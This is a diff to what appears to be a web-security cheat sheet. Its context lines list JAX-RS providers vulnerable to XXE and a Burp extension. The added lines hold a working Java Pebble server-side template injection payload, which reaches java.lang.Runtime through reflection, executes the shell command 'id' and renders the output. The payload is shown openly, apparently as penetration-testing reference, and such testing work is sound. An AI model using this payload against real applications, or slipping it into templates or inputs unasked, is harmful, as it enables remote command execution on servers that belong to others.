@@ -48,3 +48,24 @@ AtomPojoProvider (apache cxf) | application/atom+xml | Always Selected | XXE | C
 **Tools**
 
 * Unsafe JAX-RS for Burp (https://github.com/0ang3el/Unsafe-JAX-RS-Burp)
+
+> **Template Injection** 
+
+** Java Pebble Example **
+
+{% raw %}
+
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE
+     .forName('java.lang.Runtime')
+     .methods[6]
+     .invoke(null,null)
+     .exec(cmd)
+     .inputStream
+     .readAllBytes() %}
+{{ (1).TYPE
+     .forName('java.lang.String')
+     .constructors[0]
+     .newInstance(([bytes]).toArray()) }}
+   
+{% endraw %}
